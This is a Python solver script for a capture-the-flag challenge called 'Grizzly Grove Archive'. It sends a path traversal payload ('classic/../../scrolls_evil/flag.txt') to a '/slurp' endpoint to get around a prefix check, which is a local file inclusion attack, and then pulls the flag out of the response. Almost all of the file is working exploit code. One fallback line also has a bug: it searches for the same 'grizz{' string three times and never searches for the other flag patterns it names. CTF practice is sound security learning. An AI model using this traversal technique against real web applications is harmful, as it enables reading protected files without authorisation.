#!/usr/bin/env python3
import re
import sys
import argparse
from urllib.parse import urljoin

import requests


FLAG_RE = re.compile(r"(GRIZZ\{[^}]+\}|flag\{[^}]+\}|ctf\{[^}]+\})", re.IGNORECASE)

def extract_flag(text: str) -> str | None:
    m = FLAG_RE.search(text)
    return m.group(0) if m else None

def main() -> int:
    ap = argparse.ArgumentParser(description="Solver for Grizzly Grove Archive LFI (prefix-check bypass).")
    ap.add_argument("base_url", help="Base URL, e.g. http://127.0.0.1:1337/", default="http://127.0.0.1:1337/")
    ap.add_argument("--path", default="/slurp", help="Endpoint path (default: /slurp)", required=False)
    ap.add_argument("--param", default="ladle", help="Query parameter name (default: ladle)", required=False)
    args = ap.parse_args()

    base = args.base_url.rstrip("/") + "/"
    target = urljoin(base, args.path.lstrip("/"))

    # Core payload for this challenge
    payload = "classic/../../scrolls_evil/flag.txt"

    try:
        r = requests.get(
            target,
            params={args.param: payload},
            timeout=10,
        )
    except requests.RequestException as e:
        print(f"[!] HTTP error: {e}")
        return 2

    print(f"[*] GET {r.url}")
    print(f"[*] Status: {r.status_code}")

    if r.status_code != 200:
        print("[!] Non-200 response; either patched or different layout.")
        print(r.text[:500])
        return 1

    flag = extract_flag(r.text)
    if flag:
        print(f"[+] Flag: {flag}")
        return 0

    # Fallback: sometimes the flag is plain text but wrapped in <p>…</p>
    # Print a small slice so you can spot it quickly.
    print("[!] Flag pattern not found. Showing a snippet near 'GRIZZ'/'flag' if present.")
    idx = min([i for i in (r.text.lower().find("grizz{"), r.text.lower().find("grizz{"), r.text.lower().find("grizz{")) if i != -1] or [0])
    print(r.text[idx:idx+800])
    return 1


if __name__ == "__main__":
    raise SystemExit(main())

